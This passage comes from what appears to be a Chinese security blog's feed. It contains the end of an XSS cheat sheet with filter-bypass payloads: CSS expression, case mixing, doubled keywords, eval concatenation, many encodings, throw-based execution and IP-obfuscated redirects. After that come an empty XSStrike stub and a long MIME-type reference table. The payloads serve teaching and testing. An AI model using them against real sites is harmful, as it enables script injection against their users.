style="xss:expression(alert('xss''))"> &#x2F;&#x2F; IE7以下</p><div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下`​</blockquote><h4 id="​background属性​"><a href="#​background属性​" class="headerlink" title="​background属性​"></a>​<code>background属性</code>​</h4><blockquote><p>​<code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code>​</p></blockquote><p>‍</p><h3 id="存在过滤情况"><a href="#存在过滤情况" class="headerlink" title="存在过滤情况"></a>存在过滤情况</h3><h4 id="​过滤空格​​"><a href="#​过滤空格​​" class="headerlink" title="​过滤空格​​"></a><strong>​<code>过滤空格</code>​</strong>​</h4><blockquote><p>用 &#x2F; 代替空格<br> <code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code>​</p></blockquote><h4 id="​​过滤关键字​​"><a href="#​​过滤关键字​​" class="headerlink" title="​​过滤关键字​​"></a>​<strong>​<code>过滤关键字</code>​</strong>​</h4><blockquote><p>大小写绕过<br>​<code>&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</code>​<br>双写关键字(有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过)<br>​<code>&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</code>​<br>字符拼接(利用eval)<br>​<code>&lt;img src=&quot;x&quot; onerror=&quot;a=aler;b=t;c=&#39;(xss);&#39;;eval(a+b+c)&quot;&gt;</code>​<br>字符拼接(利用top)<br>​<code>&lt;script&gt;top</code>​<a href="%60%60xss%60%60"><code>&quot;al&quot;+&quot;ert&quot;</code></a>​<code>;&lt;/script&gt;</code>​(只有两个&#96;&#96;这里是为了凸显出有&#96;符号)</p></blockquote><h4 id="​​其它字符混淆​​"><a href="#​​其它字符混淆​​" class="headerlink" title="​​其它字符混淆​​"></a>​<strong>​<code>其它字符混淆</code>​</strong>​</h4><blockquote><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子<br>可利用注释、标签的优先级等<br>​<code>&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;</code>​<br>​<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(&quot;hello world!&quot;)&lt;/scri&lt;!--test--&gt;pt&gt;</code>​  </p><title><img src="/.com//title">><img src="/.com//x" onerror="alert(xss);"> 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效  ​`<SCRIPT>var a="\";alert("xss");//";</SCRIPT>`​</title></blockquote><h4 id="​​编码绕过​​"><a href="#​​编码绕过​​" class="headerlink" title="​​编码绕过​​"></a>​<strong>​<code>编码绕过</code>​</strong>​</h4><blockquote><p>​​<strong>​<code>Unicode编码绕过</code>​</strong>​<code> &lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt; &lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;</code>​<strong>​<code>url编码绕过</code>​</strong>​&#96;<br><img src="/.com//x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"></p><iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`​**​`Ascii码绕过`​**​`<img src="/.com//x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">`​**​`Hex绕过`​**​`<img src="/.com//x" onerror="eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')">`​**​`八进制绕过`​**​`<img src="/.com//x" onerror="alert('\170\163\163')">`​**​`base64绕过`​**​`<img src="/.com//x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">`​</iframe></blockquote><h4 id="​​过滤双引号，单引号​​"><a href="#​​过滤双引号，单引号​​" class="headerlink" title="​​过滤双引号，单引号​​"></a>​<strong>​<code>过滤双引号，单引号</code>​</strong>​</h4><blockquote><p>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号<br> <code>&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;</code>​<br> 使用编码绕过，具体看上面列举的例子</p></blockquote><h4 id="​​过滤括号​​"><a href="#​​过滤括号​​" class="headerlink" title="​​过滤括号​​"></a>​<strong>​<code>过滤括号</code>​</strong>​</h4><blockquote><p>当括号被过滤的时候可以使用throw来绕过<br> <code>&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;</code>​</p></blockquote><h4 id="​​过滤url地址​​"><a href="#​​过滤url地址​​" class="headerlink" title="​​过滤url地址​​"></a>​<strong>​<code>过滤url地址</code>​</strong>​</h4><blockquote><p>使用url编码<br>&lt;img src&#x3D;”x” onerror&#x3D;document.location&#x3D;<code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/</code>​&gt;<br>使用IP<br>​<code>&lt;img src=&quot;x&quot; onerror=document.location=http://2130706433/&gt;十进制 &lt;img src=&quot;x&quot; onerror=document.location=http://0177.0.0.01/&gt;八进制 &lt;img src=&quot;x&quot; onerror=document.location=http://0x7f.0x0.0x0.0x1/&gt;十六进制 &lt;img src=&quot;x&quot; onerror=document.location=//www.baidu.com&gt;html标签中用//可以代替http:// 使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)</code>​<br>使用中文逗号代替英文逗号<br>​<code>&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www。baidu。com``&quot;&gt;//会自动跳转到百度</code>​</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>XSS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS常见的触发标签</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSStrike</title>
    <link href="/2025/05/20/Web/XSS/XSStrike/"/>
    <url>/2025/05/20/Web/XSS/XSStrike/</url>
    
    <content type="html"><![CDATA[<h1 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h1><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>XSS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSStrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIME 类型</title>
    <link href="/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/MIME%20%E7%B1%BB%E5%9E%8B/"/>
    <url>/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/MIME%20%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h1><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。</p><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>MIME 类型通用结构：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">type</span>/<span class="hljs-keyword">subtype</span><br></code></pre></td></tr></table></figure><p>MIME 的组成结构非常简单，由类型与子类型两个字符串中间用 &#x2F; 分隔而组成，不允许有空格。type 表示可以被分多个子类的独立类别，subtype 表示细分后的每个类型。</p><p>MIME类型对大小写不敏感，但是传统写法都是小写。</p><p>两种主要的 MIME 类型在默认类型中扮演了重要的角色：</p><ul><li>text&#x2F;plain 表示文本文件的默认值。</li><li>application&#x2F;octet-stream 表示所有其他情况的默认值。</li></ul><h3 id="常见的-MIME-类型"><a href="#常见的-MIME-类型" class="headerlink" title="常见的 MIME 类型"></a>常见的 MIME 类型</h3><ul><li>超文本标记语言文本  <strong>.html、.html</strong>：text&#x2F;html</li><li>普通文本  <strong>.txt</strong>： text&#x2F;plain</li><li>RTF 文本  <strong>.rtf</strong>： application&#x2F;rtf</li><li>GIF 图形  <strong>.gif</strong>： image&#x2F;gif</li><li>JPEG 图形  <strong>.jpeg、.jpg</strong>： image&#x2F;jpeg</li><li>au 声音文件  <strong>.au</strong>： audio&#x2F;basic</li><li>MIDI 音乐文件 <strong>mid、.midi</strong>： audio&#x2F;midi、audio&#x2F;x-midi</li><li>RealAudio 音乐文件  <strong>.ra、.ram</strong>： audio&#x2F;x-pn-realaudio</li><li>MPEG 文件  <strong>.mpg、.mpeg</strong>： video&#x2F;mpeg</li><li>AVI 文件  <strong>.avi</strong>： video&#x2F;x-msvideo</li><li>GZIP 文件  <strong>.gz</strong>： application&#x2F;x-gzip</li><li>TAR 文件  <strong>.tar</strong>： application&#x2F;x-tar</li></ul><table><thead><tr><th>类型</th><th>描述</th><th>典型示例</th></tr></thead><tbody><tr><td>​<code>text</code>​</td><td>表明文件是普通文本，理论上是人类可读</td><td>​<code>text/plain</code>​, <code>text/html</code>​, <code>text/css, text/javascript</code>​</td></tr><tr><td>​<code>image</code>​</td><td>表明是某种图像。不包括视频，但是动态图（比如动态gif）也使用image类型</td><td>​<code>image/gif</code>​, <code>image/png</code>​, <code>image/jpeg</code>​, <code>image/bmp</code>​, <code>image/webp</code>​, <code>image/x-icon</code>​, <code>image/vnd.microsoft.icon</code>​</td></tr><tr><td>​<code>audio</code>​</td><td>表明是某种音频文件</td><td>​<code>audio/midi</code>​, <code>audio/mpeg, audio/webm, audio/ogg, audio/wav</code>​</td></tr><tr><td>​<code>video</code>​</td><td>表明是某种视频文件</td><td>​<code>video/webm</code>​, <code>video/ogg</code>​</td></tr><tr><td>​<code>application</code>​</td><td>表明是某种二进制数据</td><td>​<code>application/octet-stream</code>​, <code>application/pkcs12</code>​, <code>application/vnd.mspowerpoint</code>​, <code>application/xhtml+xml</code>​, <code>application/xml</code>​, <code>application/pdf</code>​</td></tr></tbody></table><h2 id="MIME-对照表"><a href="#MIME-对照表" class="headerlink" title="MIME 对照表"></a>MIME 对照表</h2><table><thead><tr><th>媒体类型</th><th>文件扩展名</th><th>说明</th></tr></thead><tbody><tr><td><strong>application&#x2F;msword</strong></td><td>doc</td><td>微软 Office Word 格式（Microsoft Word 97 - 2004 document）</td></tr><tr><td><strong>application&#x2F;vnd.openxmlformats-officedocument.wordprocessingml.document</strong></td><td>docx</td><td>微软 Office Word 文档格式</td></tr><tr><td><strong>application&#x2F;vnd.ms-excel</strong></td><td>xls</td><td>微软 Office Excel 格式（Microsoft Excel 97 - 2004 Workbook</td></tr><tr><td><strong>application&#x2F;vnd.openxmlformats-officedocument.spreadsheetml.sheet</strong></td><td>xlsx</td><td>微软 Office Excel 文档格式</td></tr><tr><td><strong>application&#x2F;vnd.ms-powerpoint</strong></td><td>ppt</td><td>微软 Office PowerPoint 格式（Microsoft PowerPoint 97 - 2003 演示文稿）</td></tr><tr><td><strong>application&#x2F;vnd.openxmlformats-officedocument.presentationml.presentation</strong></td><td>pptx</td><td>微软 Office PowerPoint 文稿格式</td></tr><tr><td><strong>application&#x2F;x-gzip</strong></td><td>gz, gzip</td><td>GZ 压缩文件格式</td></tr><tr><td><strong>application&#x2F;zip</strong></td><td>zip, 7zip</td><td>ZIP 压缩文件格式</td></tr><tr><td><strong>application&#x2F;rar</strong></td><td>rar</td><td>RAR 压缩文件格式</td></tr><tr><td><strong>application&#x2F;x-tar</strong></td><td>tar, tgz</td><td>TAR 压缩文件格式</td></tr><tr><td><strong>application&#x2F;pdf</strong></td><td>pdf</td><td>PDF 是 Portable Document Format 的简称，即便携式文档格式</td></tr><tr><td><strong>application&#x2F;rtf</strong></td><td>rtf</td><td>RTF 是指 Rich Text Format，即通常所说的富文本格式</td></tr><tr><td><strong>image&#x2F;gif</strong></td><td>gif</td><td>GIF 图像格式</td></tr><tr><td><strong>image&#x2F;jpeg</strong></td><td>jpg, jpeg</td><td>JPG(JPEG) 图像格式</td></tr><tr><td><strong>image&#x2F;jp2</strong></td><td>jpg2</td><td>JPG2 图像格式</td></tr><tr><td><strong>image&#x2F;png</strong></td><td>png</td><td>PNG 图像格式</td></tr><tr><td><strong>image&#x2F;tiff</strong></td><td>tif, tiff</td><td>TIF(TIFF) 图像格式</td></tr><tr><td><strong>image&#x2F;bmp</strong></td><td>bmp</td><td>BMP 图像格式（位图格式）</td></tr><tr><td><strong>image&#x2F;svg+xml</strong></td><td>svg, svgz</td><td>SVG 图像格式</td></tr><tr><td><strong>image&#x2F;webp</strong></td><td>webp</td><td>WebP 图像格式</td></tr><tr><td><strong>image&#x2F;x-icon</strong></td><td>ico</td><td>ico 图像格式，通常用于浏览器 Favicon 图标</td></tr><tr><td><strong>application&#x2F;kswps</strong></td><td>wps</td><td>金山 Office 文字排版文件格式</td></tr><tr><td><strong>application&#x2F;kset</strong></td><td>et</td><td>金山 Office 表格文件格式</td></tr><tr><td><strong>application&#x2F;ksdps</strong></td><td>dps</td><td>金山 Office 演示文稿格式</td></tr><tr><td><strong>application&#x2F;x-photoshop</strong></td><td>psd</td><td>Photoshop 源文件格式</td></tr><tr><td><strong>application&#x2F;x-coreldraw</strong></td><td>cdr</td><td>Coreldraw 源文件格式</td></tr><tr><td><strong>application&#x2F;x-shockwave-flash</strong></td><td>swf</td><td>Adobe Flash 源文件格式</td></tr><tr><td><strong>text&#x2F;plain</strong></td><td>txt</td><td>普通文本格式</td></tr><tr><td><strong>application&#x2F;x-javascript</strong></td><td>js</td><td>Javascript 文件类型</td></tr><tr><td><strong>text&#x2F;javascript</strong></td><td>js</td><td>表示 Javascript 脚本文件</td></tr><tr><td><strong>text&#x2F;css</strong></td><td>css</td><td>表示 CSS 样式表</td></tr><tr><td><strong>text&#x2F;html</strong></td><td>htm, html, shtml</td><td>HTML 文件格式</td></tr><tr><td><strong>application&#x2F;xhtml+xml</strong></td><td>xht, xhtml</td><td>XHTML 文件格式</td></tr><tr><td><strong>text&#x2F;xml</strong></td><td>xml</td><td>XML 文件格式</td></tr><tr><td><strong>text&#x2F;x-vcard</strong></td><td>vcf</td><td>VCF 文件格式</td></tr><tr><td><strong>application&#x2F;x-httpd-php</strong></td><td>php, php3, php4, phtml</td><td>PHP 文件格式</td></tr><tr><td><strong>application&#x2F;java-archive</strong></td><td>jar</td><td>Java 归档文件格式</td></tr><tr><td><strong>application&#x2F;vnd.android.package-archive</strong></td><td>apk</td><td>Android 平台包文件格式</td></tr><tr><td><strong>application&#x2F;octet-stream</strong></td><td>exe</td><td>Windows 系统可执行文件格式</td></tr><tr><td><strong>application&#x2F;x-x509-user-cert</strong></td><td>crt, pem</td><td>PEM 文件格式</td></tr><tr><td><strong>audio&#x2F;mpeg</strong></td><td>mp3</td><td>mpeg 音频格式</td></tr><tr><td><strong>audio&#x2F;midi</strong></td><td>mid, midi</td><td>mid 音频格式</td></tr><tr><td><strong>audio&#x2F;x-wav</strong></td><td>wav</td><td>wav 音频格式</td></tr><tr><td><strong>audio&#x2F;x-mpegurl</strong></td><td>m3u</td><td>m3u 音频格式</td></tr><tr><td><strong>audio&#x2F;x-m4a</strong></td><td>m4a</td><td>m4a 音频格式</td></tr><tr><td><strong>audio&#x2F;ogg</strong></td><td>ogg</td><td>ogg 音频格式</td></tr><tr><td><strong>audio&#x2F;x-realaudio</strong></td><td>ra</td><td>Real Audio 音频格式</td></tr><tr><td><strong>video&#x2F;mp4</strong></td><td>mp4</td><td>mp4 视频格式</td></tr><tr><td><strong>video&#x2F;mpeg</strong></td><td>mpg, mpe, mpeg</td><td>mpeg 视频格式</td></tr><tr><td><strong>video&#x2F;quicktime</strong></td><td>qt, mov</td><td>QuickTime 视频格式</td></tr><tr><td><strong>video&#x2F;x-m4v</strong></td><td>m4v</td><td>m4v 视频格式</td></tr><tr><td><strong>video&#x2F;x-ms-wmv</strong></td><td>wmv</td><td>wmv 视频格式（Windows 操作系统上的一种视频格式）</td></tr><tr><td><strong>video&#x2F;x-msvideo</strong></td><td>avi</td><td>avi 视频格式</td></tr><tr><td><strong>video&#x2F;webm</strong></td><td>webm</td><td>webm 视频格式</td></tr><tr><td><strong>video&#x2F;x-flv</strong></td><td>flv</td><td>一种基于 flash 技术的视频格式</td></tr></tbody></table><h3 id="按照内容类型排列的-MIME-类型列表"><a href="#按照内容类型排列的-MIME-类型列表" class="headerlink" title="按照内容类型排列的 MIME 类型列表"></a>按照内容类型排列的 MIME 类型列表</h3><table><thead><tr><th>类型&#x2F;子类型</th><th>扩展名</th></tr></thead><tbody><tr><td>application&#x2F;envoy</td><td>evy</td></tr><tr><td>application&#x2F;fractals</td><td>fif</td></tr><tr><td>application&#x2F;futuresplash</td><td>spl</td></tr><tr><td>application&#x2F;hta</td><td>hta</td></tr><tr><td>application&#x2F;internet-property-stream</td><td>acx</td></tr><tr><td>application&#x2F;mac-binhex40</td><td>hqx</td></tr><tr><td>application&#x2F;msword</td><td>doc</td></tr><tr><td>application&#x2F;msword</td><td>dot</td></tr><tr><td>application&#x2F;octet-stream</td><td>*</td></tr><tr><td>application&#x2F;octet-stream</td><td>bin</td></tr><tr><td>application&#x2F;octet-stream</td><td>class</td></tr><tr><td>application&#x2F;octet-stream</td><td>dms</td></tr><tr><td>application&#x2F;octet-stream</td><td>exe</td></tr><tr><td>application&#x2F;octet-stream</td><td>lha</td></tr><tr><td>application&#x2F;octet-stream</td><td>lzh</td></tr><tr><td>application&#x2F;oda</td><td>oda</td></tr><tr><td>application&#x2F;olescript</td><td>axs</td></tr><tr><td>application&#x2F;pdf</td><td>pdf</td></tr><tr><td>application&#x2F;pics-rules</td><td>prf</td></tr><tr><td>application&#x2F;pkcs10</td><td>p10</td></tr><tr><td>application&#x2F;pkix-crl</td><td>crl</td></tr><tr><td>application&#x2F;postscript</td><td>ai</td></tr><tr><td>application&#x2F;postscript</td><td>eps</td></tr><tr><td>application&#x2F;postscript</td><td>ps</td></tr><tr><td>application&#x2F;rtf</td><td>rtf</td></tr><tr><td>application&#x2F;set-payment-initiation</td><td>setpay</td></tr><tr><td>application&#x2F;set-registration-initiation</td><td>setreg</td></tr><tr><td>application&#x2F;vnd.ms-excel</td><td>xla</td></tr><tr><td>application&#x2F;vnd.ms-excel</td><td>xlc</td></tr><tr><td>application&#x2F;vnd.ms-excel</td><td>xlm</td></tr><tr><td>application&#x2F;vnd.ms-excel</td><td>xls</td></tr><tr><td>application&#x2F;vnd.ms-excel</td><td>xlt</td></tr><tr><td>application&#x2F;vnd.ms-excel</td><td>xlw</td></tr><tr><td>application&#x2F;vnd.ms-outlook</td><td>msg</td></tr><tr><td>application&#x2F;vnd.ms-pkicertstore</td><td>sst</td></tr><tr><td>application&#x2F;vnd.ms-pkiseccat</td><td>cat</td></tr><tr><td>application&#x2F;vnd.ms-pkistl</td><td>stl</td></tr><tr><td>application&#x2F;vnd.ms-powerpoint</td><td>pot</td></tr><tr><td>application&#x2F;vnd.ms-powerpoint</td><td>pps</td></tr><tr><td>application&#x2F;vnd.ms-powerpoint</td><td>ppt</td></tr><tr><td>application&#x2F;vnd.ms-project</td><td>mpp</td></tr><tr><td>application&#x2F;vnd.ms-works</td><td>wcm</td></tr><tr><td>application&#x2F;vnd.ms-works</td><td>wdb</td></tr><tr><td>application&#x2F;vnd.ms-works</td><td>wks</td></tr><tr><td>application&#x2F;vnd.ms-works</td><td>wps</td></tr><tr><td>application&#x2F;winhlp</td><td>hlp</td></tr><tr><td>application&#x2F;x-bcpio</td><td>bcpio</td></tr><tr><td>application&#x2F;x-cdf</td><td>cdf</td></tr><tr><td>application&#x2F;x-compress</td><td>z</td></tr><tr><td>application&#x2F;x-compressed</td><td>tgz</td></tr><tr><td>application&#x2F;x-cpio</td><td>cpio</td></tr><tr><td>application&#x2F;x-csh</td><td>csh</td></tr><tr><td>application&#x2F;x-director</td><td>dcr</td></tr><tr><td>application&#x2F;x-director</td><td>dir</td></tr><tr><td>application&#x2F;x-director</td><td>dxr</td></tr><tr><td>application&#x2F;x-dvi</td><td>dvi</td></tr><tr><td>application&#x2F;x-gtar</td><td>gtar</td></tr><tr><td>application&#x2F;x-gzip</td><td>gz</td></tr><tr><td>application&#x2F;x-hdf</td><td>hdf</td></tr><tr><td>application&#x2F;x-internet-signup</td><td>ins</td></tr><tr><td>application&#x2F;x-internet-signup</td><td>isp</td></tr><tr><td>application&#x2F;x-iphone</td><td>iii</td></tr><tr><td>application&#x2F;x-javascript</td><td>js</td></tr><tr><td>application&#x2F;x-latex</td><td>latex</td></tr><tr><td>application&#x2F;x-msaccess</td><td>mdb</td></tr><tr><td>application&#x2F;x-mscardfile</td><td>crd</td></tr><tr><td>application&#x2F;x-msclip</td><td>clp</td></tr><tr><td>application&#x2F;x-msdownload</td><td>dll</td></tr><tr><td>application&#x2F;x-msmediaview</td><td>m13</td></tr><tr><td>application&#x2F;x-msmediaview</td><td>m14</td></tr><tr><td>application&#x2F;x-msmediaview</td><td>mvb</td></tr><tr><td>application&#x2F;x-msmetafile</td><td>wmf</td></tr><tr><td>application&#x2F;x-msmoney</td><td>mny</td></tr><tr><td>application&#x2F;x-mspublisher</td><td>pub</td></tr><tr><td>application&#x2F;x-msschedule</td><td>scd</td></tr><tr><td>application&#x2F;x-msterminal</td><td>trm</td></tr><tr><td>application&#x2F;x-mswrite</td><td>wri</td></tr><tr><td>application&#x2F;x-netcdf</td><td>cdf</td></tr><tr><td>application&#x2F;x-netcdf</td><td>nc</td></tr><tr><td>application&#x2F;x-perfmon</td><td>pma</td></tr><tr><td>application&#x2F;x-perfmon</td><td>pmc</td></tr><tr><td>application&#x2F;x-perfmon</td><td>pml</td></tr><tr><td>application&#x2F;x-perfmon</td><td>pmr</td></tr><tr><td>application&#x2F;x-perfmon</td><td>pmw</td></tr><tr><td>application&#x2F;x-pkcs12</td><td>p12</td></tr><tr><td>application&#x2F;x-pkcs12</td><td>pfx</td></tr><tr><td>application&#x2F;x-pkcs7-certificates</td><td>p7b</td></tr><tr><td>application&#x2F;x-pkcs7-certificates</td><td>spc</td></tr><tr><td>application&#x2F;x-pkcs7-certreqresp</td><td>p7r</td></tr><tr><td>application&#x2F;x-pkcs7-mime</td><td>p7c</td></tr><tr><td>application&#x2F;x-pkcs7-mime</td><td>p7m</td></tr><tr><td>application&#x2F;x-pkcs7-signature</td><td>p7s</td></tr><tr><td>application&#x2F;x-sh</td><td>sh</td></tr><tr><td>application&#x2F;x-shar</td><td>shar</td></tr><tr><td>application&#x2F;x-shockwave-flash</td><td>swf</td></tr><tr><td>application&#x2F;x-stuffit</td><td>sit</td></tr><tr><td>application&#x2F;x-sv4cpio</td><td>sv4cpio</td></tr><tr><td>application&#x2F;x-sv4crc</td><td>sv4crc</td></tr><tr><td>application&#x2F;x-tar</td><td>tar</td></tr><tr><td>application&#x2F;x-tcl</td><td>tcl</td></tr><tr><td>application&#x2F;x-tex</td><td>tex</td></tr><tr><td>application&#x2F;x-texinfo</td><td>texi</td></tr><tr><td>application&#x2F;x-texinfo</td><td>texinfo</td></tr><tr><td>application&#x2F;x-troff</td><td>roff</td></tr><tr><td>application&#x2F;x-troff</td><td>t</td></tr><tr><td>application&#x2F;x-troff</td><td>tr</td></tr><tr><td>application&#x2F;x-troff-man</td><td>man</td></tr><tr><td>application&#x2F;x-troff-me</td><td>me</td></tr><tr><td>application&#x2F;x-troff-ms</td><td>ms</td></tr><tr><td>application&#x2F;x-ustar</td><td>ustar</td></tr><tr><td>application&#x2F;x-wais-source</td><td>src</td></tr><tr><td>application&#x2F;x-x509-ca-cert</td><td>cer</td></tr><tr><td>application&#x2F;x-x509-ca-cert</td><td>crt</td></tr><tr><td>application&#x2F;x-x509-ca-cert</td><td>der</td></tr><tr><td>application&#x2F;ynd.ms-pkipko</td><td>pko</td></tr><tr><td>application&#x2F;zip</td><td>zip</td></tr><tr><td>audio&#x2F;basic</td><td>au</td></tr><tr><td>audio&#x2F;basic</td><td>snd</td></tr><tr><td>audio&#x2F;mid</td><td>mid</td></tr><tr><td>audio&#x2F;mid</td><td>rmi</td></tr><tr><td>audio&#x2F;mpeg</td><td>mp3</td></tr><tr><td>audio&#x2F;x-aiff</td><td>aif</td></tr><tr><td>audio&#x2F;x-aiff</td><td>aifc</td></tr><tr><td>audio&#x2F;x-aiff</td><td>aiff</td></tr><tr><td>audio&#x2F;x-mpegurl</td><td>m3u</td></tr><tr><td>audio&#x2F;x-pn-realaudio</td><td>ra</td></tr><tr><td>audio&#x2F;x-pn-realaudio</td><td>ram</td></tr><tr><td>audio&#x2F;x-wav</td><td>wav</td></tr><tr><td>image&#x2F;bmp</td><td>bmp</td></tr><tr><td>image&#x2F;cis-cod</td><td>cod</td></tr><tr><td>image&#x2F;gif</td><td>gif</td></tr><tr><td>image&#x2F;ief</td><td>ief</td></tr><tr><td>image&#x2F;jpeg</td><td>jpe</td></tr><tr><td>image&#x2F;jpeg</td><td>jpeg</td></tr><tr><td>image&#x2F;jpeg</td><td>jpg</td></tr><tr><td>image&#x2F;pipeg</td><td>jfif</td></tr><tr><td>image&#x2F;svg+xml</td><td>svg</td></tr><tr><td>image&#x2F;tiff</td><td>tif</td></tr><tr><td>image&#x2F;tiff</td><td>tiff</td></tr><tr><td>image&#x2F;x-cmu-raster</td><td>ras</td></tr><tr><td>image&#x2F;x-cmx</td><td>cmx</td></tr><tr><td>image&#x2F;x-icon</td><td>ico</td></tr><tr><td>image&#x2F;x-portable-anymap</td><td>pnm</td></tr><tr><td>image&#x2F;x-portable-bitmap</td><td>pbm</td></tr><tr><td>image&#x2F;x-portable-graymap</td><td>pgm</td></tr><tr><td>image&#x2F;x-portable-pixmap</td><td>ppm</td></tr><tr><td>image&#x2F;x-rgb</td><td>rgb</td></tr><tr><td>image&#x2F;x-xbitmap</td><td>xbm</td></tr><tr><td>image&#x2F;x-xpixmap</td><td>xpm</td></tr><tr><td>image&#x2F;x-xwindowdump</td><td>xwd</td></tr><tr><td>message&#x2F;rfc822</td><td>mht</td></tr><tr><td>message&#x2F;rfc822</td><td>mhtml</td></tr><tr><td>message&#x2F;rfc822</td><td>nws</td></tr><tr><td>text&#x2F;css</td><td>css</td></tr><tr><td>text&#x2F;h323</td><td>323</td></tr><tr><td>text&#x2F;html</td><td>htm</td></tr><tr><td>text&#x2F;html</td><td>html</td></tr><tr><td>text&#x2F;html</td><td>stm</td></tr><tr><td>text&#x2F;iuls</td><td>uls</td></tr><tr><td>text&#x2F;plain</td><td>bas</td></tr><tr><td>text&#x2F;plain</td><td>c</td></tr><tr><td>text&#x2F;plain</td><td>h</td></tr><tr><td>text&#x2F;plain</td><td>txt</td></tr><tr><td>text&#x2F;richtext</td><td>rtx</td></tr><tr><td>text&#x2F;scriptlet</td><td>sct</td></tr><tr><td>text&#x2F;tab-separated-values</td><td>tsv</td></tr><tr><td>text&#x2F;webviewhtml</td><td>htt</td></tr><tr><td>text&#x2F;x-component</td><td>htc</td></tr><tr><td>text&#x2F;x-setext</td><td>etx</td></tr><tr><td>text&#x2F;x-vcard</td><td>vcf</td></tr><tr><td>video&#x2F;mpeg</td><td>mp2</td></tr><tr><td>video&#x2F;mpeg</td><td>mpa</td></tr><tr><td>video&#x2F;mpeg</td><td>mpe</td></tr><tr><td>video&#x2F;mpeg</td><td>mpeg</td></tr><tr><td>video&#x2F;mpeg</td><td>mpg</td></tr><tr><td>video&#x2F;mpeg</td><td>mpv2</td></tr><tr><td>video&#x2F;quicktime</td><td>mov</td></tr><tr><td>video&#x2F;quicktime</td><td>qt</td></tr><tr><td>video&#x2F;x-la-asf</td><td>lsf</td></tr><tr><td>video&#x2F;x-la-asf</td><td>lsx</td></tr><tr><td>video&#x2F;x-ms-asf</td><td>asf</td></tr><tr><td>video&#x2F;x-ms-asf</td><td>asr</td></tr><tr><td>video&#x2F;x-ms-asf</td><td>asx</td></tr><tr><td>video&#x2F;x-msvideo</td><td>avi</td></tr><tr><td>video&#x2F;x-sgi-movie</td><td>movie</td></tr><tr><td>x-world&#x2F;x-vrml</td><td>flr</td></tr><tr><td>x-world&#x2F;x-vrml</td><td>vrml</td></tr><tr><td>x-world&#x2F;x-vrml</td><td>wrl</td></tr><tr><td>x-world&#x2F;x-vrml</td><td>wrz</td></tr><tr><td>x-world&#x2F;x-vrml</td><td>xaf</td></tr><tr><td>x-world&#x2F;x-vrml</td><td>xof</td></tr></tbody></table><h3 id="按照文件扩展名排列的-MIME-类型列表"><a href="#按照文件扩展名排列的-MIME-类型列表" class="headerlink" title="按照文件扩展名排列的 MIME 类型列表"></a>按照文件扩展名排列的 MIME 